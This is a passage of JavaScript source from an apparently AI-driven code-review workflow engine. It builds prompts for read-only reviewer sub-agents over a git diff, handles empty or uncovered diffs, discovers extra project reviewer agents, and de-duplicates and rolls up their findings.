// `fresh` (priorRound=null) always keeps the full base...HEAD scan.
const lensBase = lensScope()
// The base the lenses diff against, logged on a re-review with whether this round is a full re-scan.
function lensScope() {
  const scopeBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
  if (priorRound) {
    log(`Re-review round ${thisRound} lens scope: ${fullRescan
      ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}${priorRoundJournalSourced ? ', prior round journal-sourced' : ''}) — earlier misses in untouched code are re-checked`
      : `incremental delta ${flattenField(priorRound['head'])}...HEAD (fix commits only)`}`)
  }
  return scopeBase
}

// Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
// the detector missed (best-effort detection), honor the pin. An unknown pin id is an ERROR (it used
// to be dropped by `filter(Boolean)`), and a diff no profile covers is INCOMPLETE, never an Approve.
const { pinned: pinnedLangs, unknown: unknownLangs } = resolveProfilePin(PROFILES, requestedLangs)
async function unknownPinExit() {
  const msg = unknownPinMessage(PROFILES, unknownLangs)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    languages: [], verdict: 'INCOMPLETE (unknown language pin)', findings: summarizeFindings([]), dimensions: [], verification: null,
    notRun: [`nothing ran — ${msg}`, ...scopeNotRun, ...extraLensesNotRun('the language pin is unknown')], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([`## Verdict`, `⛔ INCOMPLETE — ${msg}. NOTHING WAS REVIEWED; fix the \`languages\` argument and re-run.`].join('\n') + scopeSection())
}
const detectedActive = Object.values(PROFILES).filter(p => (!pinnedLangs || pinnedLangs.includes(p.id)) && p.detect(changedFiles))
// ORDER IS LOAD-BEARING, and it lives in resolveCoverage: the guards are decided from
// `changedFiles`, BEFORE the pin fallback may populate `active`. The fallback used to run first,
// and since every internal caller (rust-review, nix-review, both rust-audit dispatches) pins a
// language, `active` was never empty and the whole guard block below was dead code on exactly the
// paths that matter: a rust-audit over a diff that resolved empty ran the full lens pipeline over
// nothing and returned a bare `✅ Approve — no findings across rust`.
const coverage = resolveCoverage({ profiles: PROFILES, changedFiles, detectedActive, pinnedLangs })
const active = coverage.active
// The coverage decision's early exits: an empty diff, nothing reviewable, or no profile for what changed.
async function coverageExit() {
  if (coverage.outcome === 'no-profile') memory = skippedMemory(memory, 'no language profile for the changed files')
  else if (coverage.outcome !== 'review') memory = skippedMemory(memory, 'nothing to review')
  if (coverage.outcome === 'empty') return emptyDiffExit()
  if (coverage.outcome === 'nothing-to-review') return nothingToReviewExit()
  if (coverage.outcome === 'no-profile') return noProfileExit()
  return null
}
// Whether the empty diff is a launch on the trunk itself: the agent's own rev-parse comparison first, the sha
// test the fallback when it answered none. An explicit `base` equal to HEAD is the caller's choice, not a
// launch on the trunk (realm @nick/craft, node #251).
function launchedOnTrunk() {
  if (baseArg) return false
  return detected?.baseIsHead === true || baseIsHead(baseRef || '', head)
}
/** The Detected line of an empty diff. @param {boolean} onTrunk @returns {string} */
function emptyDetectedLine(onTrunk) {
  if (onTrunk) return `HEAD ${head}${branch ? ` on \`${branch}\`` : ''} is the base itself (${baseRef}): 0 changed file(s)`
  return detected?.notes || `0 changed file(s) against ${baseRef || 'HEAD'}`
}
async function emptyDiffExit() {
  const onTrunk = launchedOnTrunk()
  const emptyMsg = onTrunk ? onTrunkMessage() : noChangedFilesMessage()
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    // The base this run resolved, so a later reader of the store can see what the empty diff was taken against.
    base: baseRef || '',
    languages: [], verdict: 'INCOMPLETE (empty diff)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: [], notRun: [emptyMsg, ...scopeNotRun, ...extraLensesNotRun('the diff is empty', false)], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `⚠️ INCOMPLETE — ${emptyMsg}`,
    ``, `## Detected`, emptyDetectedLine(onTrunk),
  ].join('\n') + scopeSection())
}
async function nothingToReviewExit() {
  // Nothing was reviewed AND nothing needed reviewing — an honest green, not a coverage hole. A
  // marker that fires on every README-only change stops being read.
  const okMsg = nothingToReviewMessage(changedFiles.length)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    languages: [], verdict: 'Approve (nothing to review)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: changedFiles, notRun: [...scopeNotRun, ...extraLensesNotRun('nothing reviewable changed', false)], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `✅ Approve (NOTHING TO REVIEW) — ${okMsg}`,
    ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`),
  ].join('\n') + scopeSection())
}
async function noProfileExit() {
  const msg = noLanguageMessage(PROFILES, changedFiles.length, coverage.material.length)
  await logRun({
    schemaVersion: 1, runtime: 'claude-code', craftVersion: CRAFT_VERSION, kind: 'workflow', name: 'review', nested: !!viaArg, via: viaArg || null, memory: memoryRecord(memory),
    languages: [], verdict: 'INCOMPLETE (no language profile)', findings: summarizeFindings([]), dimensions: [], verification: null,
    uncoveredFiles: changedFiles, notRun: [msg, ...scopeNotRun, ...extraLensesNotRun('no language profile covers the diff')], ...depthRecordFields(), outputTokens: budget.spent(),
  })
  return out([
    `## Verdict`, `⚠️ INCOMPLETE — ${msg}`,
    ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
  ].join('\n') + scopeSection())
}
// An unknown language pin first: it stops the run before any profile is activated.
const languageStop = unknownLangs.length ? await unknownPinExit() : await coverageExit()
if (languageStop !== null) return languageStop
// ONE read-only agent recalls the decisions through the craft:memory skill for the diff's paths (realm
// @nick/craft, node #203); its answer is parsed like a passed list and the passed records merge into it.
// After the coverage exits: a diff with nothing to review or no profile spends no recall agent.
async function recallMemory() {
  if (recalledByLauncher || !changedFiles.length) return
  const r = await recallDecisions(p => ragent(p, { label: 'memory-recall', phase: 'Scout', schema: MEMORY_RECALL_SCHEMA, effort: 'low' }), changedFiles, baseRef || '')
  const m = mergeRecall(r, A['priorDecisions'], parsePriorDecisions)
  priorDecisionsIn = m.prior
  memory = m.memory
  for (const x of m.recalledRefused) log(`⚠️ priorDecisions: ${x}`)
}
await recallMemory()
function logActiveProfiles() {
  log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinned: ${pinnedLangs.join(',')})` : ''} · base ${baseRef || 'HEAD'}`)
}
logActiveProfiles()

// Changed files no active profile covers are NOT reviewed — say so instead of silently shrinking scope.
// The ones that are a real coverage gap (see coverageGapFiles: material AND not project config)
// additionally reach the verdict further down, so it carries the (INCOMPLETE) marker rather than a
// bare Approve.
const uncoveredFiles = changedFiles.filter((/** @type {string} */ f) => !active.some(p => p.detect([f])))
const uncoveredGap = coverageGapFiles(uncoveredFiles)
function logUncoveredFiles() {
  if (uncoveredFiles.length) log(`Outside all active profiles (not reviewed): ${uncoveredFiles.join(', ')}${uncoveredGap.length ? ` — ${uncoveredGap.length} unreviewed source file(s)` : ' (docs/assets/lockfiles/project config only — not a coverage gap)'}`)
}
logUncoveredFiles()

// ================= Prompt builders (profile-parameterized) =================
/** @param {Profile} profile */
function scoutPrompt(profile) {
  return `You are scouting a ${profile.lang} diff to plan an elastic review. Use shell + read only — do NOT review yet.${pathArg ? `\n\nSCOPE: review ONLY the crate/dir at \`${flattenField(pathArg)}\`. Pass \`-- ${shq(pathArg)}\` to every \`git diff\` command below.` : ''}

Diff base: ${lensBaseLabel()}. Consider only this profile's files (${profile.diffGlobs.join(' ')}).
1. Inspect \`git diff --stat ${lensBase ? `${shq(lensBase)}...HEAD` : 'HEAD'} -- ${profile.diffGlobs.join(' ')}\`. Set sizeBucket:
   small = a few files / < ~80 changed lines; large = many files / > ~400 lines or a public-API-heavy change; medium otherwise.
2. lenses: choose from ${JSON.stringify(profile.lenses)}.
   - small: only the touched categories (minimum 2; always include the dominant category, and include '${profile.safetyLens}' unless the diff clearly touches nothing related to ${profile.securityHints}).
   - medium: the categories plausibly in play.
   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter((/** @type {string} */ l) => CONDITIONAL_LENSES.includes(l)))} — the
     engine adds those itself off a code signal in the diff, so picking one here only pays for an
     agent the signal did not ask for. Do not count them toward your choices.
   ${profile.scoutRules}${strict ? '\n   STRICT MODE is on: ALWAYS include \'maintainability\' in lenses regardless of size.' : ''}
3. isLibrary: ${profile.usesLibrary ? 'true if this is a published library (has `[lib]`/looks publishable) — best effort.' : 'always false (not applicable to this language).'}
4. securitySensitive: true if the diff touches ${profile.securityHints}.
5. intent: ${intentArg ? `the caller provided: "${intentArg}". Refine it from the diff if needed.` : 'infer the change\'s purpose from the diff and any PR/commit messages; empty string if unclear.'}
6. churn: list up to 5 files in the diff that git shows as frequently changed (\`git log --oneline -n 50 -- <file> | wc -l\` is a rough proxy). May be empty.
7. surfaces: classify what the diff TOUCHES so the engine can skip a whole-repo lens whose defect class this diff cannot exhibit. Answer CONSERVATIVELY — if unsure, OMIT the field (or the individual key), or set it true; NEVER guess false. A false you are not sure of silences a lens.
   - crossBoundarySymbol: does the diff change the signature/shape of an exported/\`pub\` symbol that unchanged code depends on?
   - wireForm: does it change a contract that a party running ANOTHER version reads, calls or deploys against — a CRD schema or API version list, a serde type, an HTTP/OpenAPI shape, a protocol, a CLI flag / exit code / output format, a config key, an env var, a Helm value, a default, a renamed exported name?
   - invariantType: does it change a type that carries an invariant other code relies on?`
}

/** @param {string} priorSummary @param {Profile} profile @param {Plan} plan */
function negativeSpacePrompt(priorSummary, profile, plan) {
  const intent = plan?.intent ?? intentArg
  return `You are the **negative-space** review lens for a ${profile.lang} change. Unlike the other lenses, your job is NOT to review the changed lines — it is to find the bug the diff ENABLES in code it did NOT touch. ${profile.navSkill ? `Load the ${profile.navSkill} skill for whole-repo search; use` : 'Use'} Grep/Glob across the ENTIRE tree, not just the diff.

Diff base: ${lensBaseLabel()}.
${intent ? `INTENT (what the change should do): ${intent}` : ''}
${plan?.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — an invariant the author claims here may be broken by the UNCHANGED code you inventory below):\n"""\n${plan.spec}\n"""` : ''}

METHOD — follow in order:
1. Inventory the NEW surface the diff introduces. Read the FULL diff: \`git diff ${lensDiffRange()}\`. List every new: ${profile.lang === 'Nix' ? 'flake output / module option / package attr / overlay / renamed binding' : 'enum variant / status value / DB column / table / migration / public fn / route / struct field'}. ALSO list any UNCHANGED definition the diff now references or relies on for the first time.
2. For EACH item, Grep the UNCHANGED tree for existing code that reads, references, ${profile.lang === 'Nix' ? 'imports, or overrides' : 'lists, updates, deletes, cascades, serializes, orders, or authorizes'} that shape. Ask: does this pre-existing path violate an invariant the change assumes?
3. Report each concrete violation ANCHORED TO THE UNCHANGED file:line that is actually wrong, not the diff line. That anchor is real — cite it precisely so it can be verified.

Only report a violation you can name a concrete reachable path for. Put the triggering surface in \`blastRadius\`; in \`why\`, state the invariant and the exact old path that breaks it. Do NOT restate findings already in the ALREADY-FOUND set below — look for what they MISSED.

ALREADY-FOUND (from other lenses / earlier rounds — do not repeat):
${priorSummary}

Return {lens: "negative-space", findings: [...]} using the shared finding schema. Set \`ruleId\` to the matching ${profile.rubricSkill} rules.md ID or "" if none fits. Observability: the workflow records this run — do NOT write your own record.`
}

/** The diff base as the lens prompts name it. */
function lensBaseLabel() {
  return lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes / most recent commit'
}

/** The `git diff` range argument the lens prompts hand the agent. */
function lensDiffRange() {
  return lensBase ? `--merge-base ${shq(lensBase)}` : 'HEAD'
}

/** @param {Slice | null} slice @param {Profile} profile */
function lensPathspec(slice, profile) {
  return slice ? slice.files.map(pathspecLiteral).filter(Boolean).map(shq).join(' ') : profile.diffGlobs.join(' ')
}

/** @param {string} lens */
function strictMaintainabilityLine(lens) {
  return strict && lens === 'maintainability' ? '\nSTRICT MODE: apply the maintainability bar as a *presumption of block* — each maintainability issue is a blocker unless the author clearly justified it in the diff or brief. Be harsh, but stay grounded — every finding still needs a concrete cited file:line and survives refutation; do not invent issues.\n' : ''
}

/** @param {Slice | null} slice */
function sliceBlock(slice) {
  return slice ? `YOUR SLICE: \`${slice.key}\` — ${slice.files.length} changed file(s) of a larger diff. Sibling lenses hold the rest, and overlapping findings are de-duplicated downstream.
This bounds WHAT YOU JUDGE, never what you may READ: trace definitions, uses and consumers anywhere in the repository, and pin every off-site premise in \`whereChecked\` exactly as usual. A defect whose evidence sits outside your slice is still yours to report if it is CAUSED by a line in your slice — say so in \`why\`. A defect located in another slice is not yours; do not report it.
EFFICIENCY: pull your slice's diff ONCE, in one command. Do not re-run broad searches over the whole tree — every turn re-reads everything already in your context, so a wide grep is paid for again on each turn that follows it.` : ''
}

/** The re-review framing of a lens prompt, empty on a first round. */
function reReviewBlock() {
  return priorRound ? (fullRescan
  ? `RE-REVIEW (full re-scan): review the WHOLE diff (base ${flattenField(lensBase)}...HEAD), not just the latest fixes — an earlier round may have missed a defect in code it did not touch. Prior findings are adjudicated separately and any you re-surface are de-duplicated downstream, so spend your effort on defects that are NOT already obviously known.`
  : `RE-REVIEW: you are reviewing ONLY the fix commits since the prior round (base ${flattenField(lensBase)}). Prior findings are adjudicated separately — do not re-report them; surface only NEW defects the fixes introduced.`) : ''
}

/** @param {Plan} plan */
function lensPlanLines(plan) {
  return `${plan.intent ? `INTENT (what the change should do): ${plan.intent}` : ''}
${plan.spec ? `STATED SPEC / AUTHOR CLAIMS (verbatim PR/commit description — treat as the spec; the intent lens must check EACH claim against the code, and any lens may use it):\n"""\n${plan.spec}\n"""` : ''}
${plan.churn?.length ? `HOT FILES (scrutinize harder): ${plan.churn.join(', ')}` : ''}`
}

/** @param {Profile} profile @param {string} lens @param {Plan} plan */
function mutantsLine(profile, lens, plan) {
  return profile.id === 'rust' && lens === 'tests' && (plan.sizeBucket === 'medium' || plan.sizeBucket === 'large') ? 'If `cargo mutants` is installed, you MAY run it time-boxed on the changed files to surface contracts no test would catch a regression on; skip silently if absent.' : ''
}

// Where a lens reads its catalogue. Lenses run as the reviewer agent, which has no Skill tool, so
// naming a skill reached nothing; the file is located the way the logger is (an explicit craftRoot,
// CLAUDE_PLUGIN_ROOT, the installed cache for this version — see loggerPrelude) and NEVER resolved
// against the reviewed repository, whose copy would be untrusted text steering the lens. Built at use
// time for the same reason as loggerPreludeNow: CRAFT_VERSION is declared below. Each entry names the
// classes its brief carries inline, which are the fallback when no candidate is readable.
/** @type {Record<string, { label: string, file: string, fallback: string }>} */
const LENS_CATALOGUES = {
  reconciler: { label: 'RACE CATALOGUE', file: 'skills/distributed-races/catalogue.md', fallback: 'R1–R6' },
  compat: { label: 'COMPATIBILITY CATALOGUE', file: 'skills/compatibility/catalogue.md', fallback: 'C1–C4, C8, C9 and C11–C13' },
}
/** @param {string} lens */
function lensCatalogueLine(lens) {
  const cat = Object.prototype.hasOwnProperty.call(LENS_CATALOGUES, lens) ? LENS_CATALOGUES[lens] : undefined
  if (!cat) return ''
  const root = flattenField(craftRootArg)
  const candidates = [
    root ? `${root}/${cat.file}` : '',
    `\${CLAUDE_PLUGIN_ROOT}/${cat.file}`,
    `\${CLAUDE_CONFIG_DIR:-$HOME/.claude}/plugins/cache/craft/craft/${CRAFT_VERSION}/${cat.file}`,
  ].filter(Boolean).map(c => `\`${c}\``)
  return `${cat.label}: read the first of these that exists (expand the variables with Bash): ${candidates.join(', ')}. Never read a copy inside the reviewed repository. None readable → work ${cat.fallback} from the brief above and say the catalogue was unavailable.`
}

/** @param {string} lens @param {string} priorSummary @param {Profile} profile @param {Plan} plan @param {Slice | null} [slice] */
function lensPrompt(lens, priorSummary, profile, plan, slice = null) {
  if (lens === 'negative-space') return negativeSpacePrompt(priorSummary, profile, plan)
  // The pathspec the lens reviews. A slice replaces the profile's globs with its own files — that
  // is the entire mechanism: the agent pulls what it is responsible for instead of the whole diff,
  // and the per-turn re-read it pays for the rest of its life shrinks by the same factor.
  const pathspec = lensPathspec(slice, profile)
  return `You are the **${lens}** review lens for a ${profile.lang} diff. Review ONLY this slice; ignore everything else (other lenses cover it). Load the ${profile.rubricSkill} skill for the rubric${profile.navSkill ? ` and the ${profile.navSkill} skill for context expansion` : ''}.

SLICE: ${profile.lensBrief[lens] || lens}
${lensCatalogueLine(lens)}
${strictMaintainabilityLine(lens)}
Diff base: ${lensBaseLabel()}. Review with \`git diff ${lensDiffRange()} -- ${pathspec}\`.
${sliceBlock(slice)}
${reReviewBlock()}
${lensPlanLines(plan)}

CONTEXT EXPANSION (required): for each finding, trace definitions / uses / consumers of the changed symbols (Grep/Glob${profile.navSkill ? ' + LSP' : ''}) before judging — do not read the diff in isolation. If a finding depends on code outside the diff, say so in \`why\`.
BLAST-RADIUS (required): for each changed PUBLIC surface you touch, note how many consumers are affected and set a breaking-change flag in \`blastRadius\`.
CONFIDENCE: report everything you suspect, located. Do NOT self-censor borderline findings — verification happens downstream. Each finding needs file:line (use file:"" line:0 only when truly not locatable).
WHERE-CHECKED (required field): a finding usually rests on a premise that is NOT visible at the line you cite — "the dependency rejects this", "this is reachable from untrusted input", "no caller guards it", "the sibling path does X". Every such premise must be pinned to a \`file:line\` you ACTUALLY OPENED and read, including inside dependency sources (\`~/.cargo/registry\`, the vendored tree, the flake input) — put them in \`whereChecked\`. An off-site premise you did not open is not admissible: either open it, or drop the claim and report only what the cited line itself shows. Set \`whereChecked\` to "" ONLY when the finding needs no off-site premise at all. Do not restate the cited defect line there — it adds nothing. ${DEPENDENCY_SOURCE_HOW}
RULE ID (required field): set \`ruleId\` to the matching catalog ID from the ${profile.rubricSkill} skill's rules.md when the finding maps to a listed rule; use "" for a novel finding with no catalog rule. Do not force a bad fit.
${mutantsLine(profile, lens, plan)}
ALREADY-FOUND (do not repeat; look for what these MISSED):
${priorSummary}

Return {lens, findings[]}.

Observability: the review workflow records this run — do NOT write your own record.`
}

// A consumer's own agent run as an extra lens (realm @nick/craft, node #295): the whole change, no
// slice and no profile pathspec, answering in the finding schema every lens answers in.
/** @param {string} agentType @param {string} priorSummary */
function extraLensPrompt(agentType, priorSummary) {
  return `You are an additional review lens supplied by this project (agent type \`${agentType}\`), run beside the engine's own lenses over the same change. Review it with your own rubric.

Diff base: ${lensBaseLabel()}. Review with \`git diff ${lensDiffRange()}${pathArg ? ` -- ${shq(pathArg)}` : ''}\` -- the whole change, every file in it.
${reReviewBlock()}
Report each finding located at file:line (file:"" line:0 only when truly not locatable), with severity (Critical, High, Medium, Low or Info), title, why, fix and blastRadius. Set \`source\` to "${agentType}", \`ruleId\` to "" unless your own rubric names one, and \`whereChecked\` to the file:line you actually opened for any premise not visible at the cited line ("" when there is none). Report what you suspect; verification happens downstream.
READ-ONLY (hard rule): change nothing in the working copy. No file writes, no git commit, push, checkout, switch, reset or stash, no formatter or fixer runs. Read, search and run read-only commands (git diff, git log, git show) only, and report findings -- never fix them.
ALREADY-FOUND (do not repeat; look for what these MISSED):
${priorSummary}

Return {lens: "${agentType}", findings[]}.

Observability: the review workflow records this run -- do NOT write your own record.`
}

// Dispatches every requested extra lens once, in parallel, on its own agent type: no generic fallback,
// since a generic subagent is not the consumer's reviewer. A throw, a null and an off-schema answer are
// each recorded by class (the error text goes to the log only) and the lens contributes nothing.
/** @param {string[]} agents @param {string} priorSummary @returns {Promise<Finding[]>} */
async function runExtraLenses(agents, priorSummary) {
  const settled = await parallel(agents.map(agentType => () => dispatchExtraLens(agentType, priorSummary)))
  return settled.flatMap(r => r || [])
}

/** The extra lenses' findings: dispatched for the first profile only. @param {Profile} profile @param {Finding[]} pool @returns {Promise<Finding[]>} */
function extraLensesFor(profile, pool) {
  lensPhaseReached = true
  if (profile !== active[0]) return Promise.resolve([])
  extraLensOutcome.reached = true
  if (extraLensRequest.how === 'off') return Promise.resolve([])
  const summary = priorFoundSummary(pool)
  return chosenExtraLenses().then(agents => (agents.length ? runExtraLenses(agents, summary) : []))
}

// Named by the caller, or discovered: ONE cheap agent lists the session project's agent definitions
// and pickRepoReviewers keeps those that review and do not edit (realm @nick/craft, node #295); on a
// `repo` that is not the session's project (discoveryApplies) none is run.
/** @returns {Promise<string[]>} */
async function chosenExtraLenses() {
  if (extraLensRequest.how === 'named') return extraLensRequest.agents
  const listed = await listRepoAgents()
  if (!listed) {
    extraLensOutcome.discovery = 'the agent listing the session project\'s agent definitions did not answer'
    return []
  }
  if (!discoveryApplies(Boolean(repoArg), listed.sessionCommonDir, listed.repoCommonDir)) {
    extraLensOutcome.discovery = DISCOVERY_SKIPPED
    log(`extra lenses: ${DISCOVERY_SKIPPED} (session ${JSON.stringify(listed.sessionCommonDir)}, repo ${JSON.stringify(listed.repoCommonDir)})`)
    return []
  }
  const defs = Array.isArray(listed.agents) ? listed.agents : []
  const agents = pickRepoReviewers(defs)
  extraLensOutcome.discovery = defs.length ? `${defs.length} agent definition(s) read, none describes itself as reviewing without editing` : 'the session\'s project declares no agent under .claude/agents'
  log(`extra lenses discovered: ${agents.length ? agents.join(', ') : 'none'} (of ${defs.length} agent definition(s) in the session's project)`)
  return agents
}

// The session project's own agent definitions, or null when the listing agent died, threw or hit the
// budget: discovery is best-effort and never fails the run. Read where the session started, NOT in
// `repo`: a bare agent type is assumed, not observed, to resolve among the session's agents (realm
// @nick/craft, node #178), so the names and their tool checks come from there too (node #295).
/** @returns {Promise<AgentDefinitionsAnswer | null>} */
async function listRepoAgents() {
  try {
    return await ragent(`List the agent definitions the project this session runs in declares: the \`.claude/agents/*.md\` files directly in \`.claude/agents\` at the root of the session's project -- the git toplevel of the directory you START in (\`git rev-parse --show-toplevel\`; that directory itself when it is not a git repository). Not recursive: never a file inside \`.claude/worktrees/\`, a vendored or dependency tree, a plugin, or anywhere else. Do not cd into any other repository. For each, read its YAML frontmatter and return its \`name\` (the file name without .md when there is none), its \`description\` verbatim, and its \`tools\` and \`disallowedTools\` values verbatim ("" for each one absent). No such directory or no files -> agents: [].
Also report sessionCommonDir: the absolute, symlink-resolved git common dir of the directory you start in (\`(cd "$(git rev-parse --git-common-dir)" && pwd -P)\`), "" when it is not a git repository; and repoCommonDir: ${repoArg ? `the same for ${shq(repoArg)} (\`(cd ${shq(repoArg)} && cd "$(git rev-parse --git-common-dir)" && pwd -P)\`), "" when that fails` : '""'}. Use shell + read only; change nothing.`,
    { label: 'extra-lens-discovery', phase: 'Lenses', schema: AGENT_DEFINITIONS_SCHEMA, model: 'haiku', effort: 'low', inSessionDir: true })
  } catch (e) {
    log(`\u26a0\ufe0f extra-lens discovery threw: ${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 160)}`)
    return null
  }
}

// Each failed or refused NAMED extra lens as a coverage gap of the first profile. A discovered one that
// could not run is said in the Extra lenses section only: discovery is on by default in a light pass,
// and resolving a project agent from a plugin workflow is not observed (realm @nick/craft, node #178),
// so its failure must not turn every such run INCOMPLETE.
/** @param {Profile} profile @returns {string[]} */
function extraLensGaps(profile) {
  return profile === active[0] && extraLensRequest.how === 'named' ? extraLensOutcome.failed.map(extraLensGapLine) : []
}

/** @param {{ agent: string, why: string }} x */
function extraLensGapLine(x) {
  return `extra lens ${x.agent} -- ${x.why}, so its review did not happen`
}

// An exit before the lenses ran: the extra lenses did not run either, and the report and the record
// say so with the reason (realm @nick/craft, node #295). A named one is a coverage gap; a discovery
// that never ran is said in the Extra lenses section. Returns the gaps' notRun lines.
/** @param {string} reason @returns {string[]} */
function extraLensesNotRun(reason, needed = true) {
  if (extraLensOutcome.reached || extraLensRequest.how === 'off') return []
  extraLensOutcome.reached = true
  extraLensOutcome.exit = { reason, needed }
  // Nothing to review (an empty or docs-only diff): a named lens was not needed, which is no gap.
  if (extraLensRequest.how === 'named' && needed) extraLensOutcome.failed.push(...extraLensRequest.agents.map(agentTypeName => ({ agent: agentTypeName, why: `not run: ${reason}` })))
  return extraLensOutcome.failed.map(extraLensGapLine)
}

/** The record's depth and extra-lens fields, on every record this engine writes (#295). */
function depthRecordFields() {
  return { depth: reviewDepth, extraLenses: { how: extraLensRequest.how, requested: extraLensRequest.agents, ran: extraLensOutcome.ran, failed: extraLensOutcome.failed, ...(extraLensOutcome.exit ? { exit: extraLensOutcome.exit } : {}) } }
}

/** Adds the findings whose key is not yet seen. @param {Finding[]} found @param {Set<string>} seen @param {Finding[]} pool */
function pushUnseen(found, seen, pool) {
  for (const f of found) { const k = key(f); if (!seen.has(k)) { seen.add(k); pool.push(f) } }
}

// A consumer repository's own agent type, launched by the name its repository gives it: the one launch not
// under craft's prefix, marked for lib/launch-names.mjs (realm @nick/craft, node #295). The mark is read in the
// shipped bundle, and esbuild's syntax minifier inlines a call to a function that only returns its argument, so
// the body is not the bare `return name`: String() of the name the caller already holds as a string.
/** @param {string} name */
function consumerAgentType(name) {
  return String(name)
}

/** @param {string} agentType @param {string} priorSummary @returns {Promise<Finding[]>} */
async function dispatchExtraLens(agentType, priorSummary) {
  /** @type {FindingsAnswer | null} */
  let res = null
  try {
    res = await ragent(extraLensPrompt(agentType, priorSummary), { label: `extra-lens:${agentType}`, phase: 'Lenses', schema: FINDINGS_SCHEMA, agentType: consumerAgentType(agentType) })
  } catch (e) {
    const msg = String((e && /** @type {{ message?: unknown }} */ (e).message) || e)
    log(`\u26a0\ufe0f extra lens ${agentType} threw: ${msg.slice(0, 160)}`)
    extraLensOutcome.failed.push({ agent: agentType, why: isAgentTypeMissing(msg, agentType) ? 'the agent type is not registered in this session' : 'the agent failed before answering' })
    return []
  }
  if (res == null || !Array.isArray(/** @type {{ findings?: unknown }} */ (res).findings)) {
    extraLensOutcome.failed.push({ agent: agentType, why: res == null ? 'returned nothing (an unknown agent type on some runtimes, or a dead agent)' : 'answered off-schema (no findings array)' })
    log(`\u26a0\ufe0f extra lens ${agentType} returned no findings array${extraLensRequest.how === 'named' ? ' -- recorded as a coverage gap' : ' -- reported, not a gap (discovered)'}`)
    return []
  }
  extraLensOutcome.ran.push(agentType)
  return res.findings.map(f => ({ ...f, source: `extra:${agentType}`, foundInRound: 1 }))
}


// Cross-lens dedup BEFORE verification. key() above is exact (file:line:title), so two lenses
// wording the same defect differently both enter the pool — and each duplicate would buy its own
// verifier fan-out. A cheap grouping pass merges same-defect findings first; synthesis keeps its
// own dedup instruction as a safety net.
/** @type {Schema<DedupAnswer>} */
const DEDUP_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['groups'],
  properties: {
    groups: {
      type: 'array',
      items: { type: 'array', items: { type: 'integer' } },
      description: 'each inner array = indices of findings that describe the SAME underlying defect; singletons omitted; empty if all distinct',
    },
  },
}
// The round that first found a finding, and what each round's findings became (realm @nick/craft, node #248).
// Mechanical roll-up of high-volume, low-value rule IDs. The api-idioms lens brief already ASKS for
// this ("do NOT file one finding per occurrence — roll repeated instances into ONE finding"), and the
// run store shows it is not obeyed: one lens produced 126 confirmed findings over 21 runs, 100 of
// them Low/Info. An instruction the model can quietly skip is not a cap; this is. The excess is
// folded into the representative finding rather than dropped, and the count is stated in the title
// and logged — a silent truncation would read as "there were only N", which is worse than the flood.
const ROLLUP_MAX = 3
/** @param {Finding[]} pool @param {Profile} profile */
function rollupPool(pool, profile) {
  const ids = profile.rollupRuleIds || []
  if (!ids.length) return pool
  const { groups, out: rolled } = rollupGroups(pool, ids)
  for (const [, g] of groups) rolled.push(...rolledUp(g, profile))
  return rolled
}

/**
 * The pool split into findings a roll-up rule names, grouped by lens and rule, and the rest in order.
 * @param {Finding[]} pool @param {string[]} ids @returns {{ groups: Map<string, Finding[]>, out: Finding[] }}
 */
function rollupGroups(pool, ids) {
  /** @type {Map<string, Finding[]>} */
  const groups = new Map()
  const loose = []
  for (const f of pool) {
    const id = f['ruleId'] || ''
    if (!ids.includes(id)) { loose.push(f); continue }
    const k = `${f['source'] || ''}::${id}`
    let g = groups.get(k)
    if (!g) { g = []; groups.set(k, g) }
    g.push(f)
  }
  return { groups, out: loose }
}

/** A finding's severity rank, unknown severities last. @param {Finding} f */
function sevRankOf(f) {
  return SEV_RANK[f['severity'] ?? ''] ?? 9
}

/** One roll-up group as it enters the pool: as is up to ROLLUP_MAX, else the worst ROLLUP_MAX and one folded finding. @param {Finding[]} g @param {Profile} profile @returns {Finding[]} */
function rolledUp(g, profile) {
  // Order by severity so the representative is the worst instance, not an arbitrary one.
  const sorted = g.slice().sort((/** @type {Finding} */ a, /** @type {Finding} */ b) => sevRankOf(a) - sevRankOf(b))
  if (sorted.length <= ROLLUP_MAX) return sorted
  const keep = sorted.slice(0, ROLLUP_MAX)
  const folded = sorted.slice(ROLLUP_MAX)
  const rep = /** @type {Finding} */ (folded[0])   // folded is non-empty: sorted.length > ROLLUP_MAX
  const where = folded.slice(0, 6).map((/** @type {Finding} */ f) => `${f['file'] || '?'}:${f['line'] || 0}`).join(', ')
  const rolled = [...keep, withEarliestRound({
    ...rep,
    title: `${rep.title} — and ${folded.length - 1} more of the same (${rep.ruleId})`,
    why: `${rep.why} Repeated ${folded.length} more times across the diff (${where}${folded.length > 6 ? ', …' : ''}); rolled into one finding because per-occurrence reporting of this rule buries the rest of the review. Fix the pattern, not the instance.`,
  }, folded)]
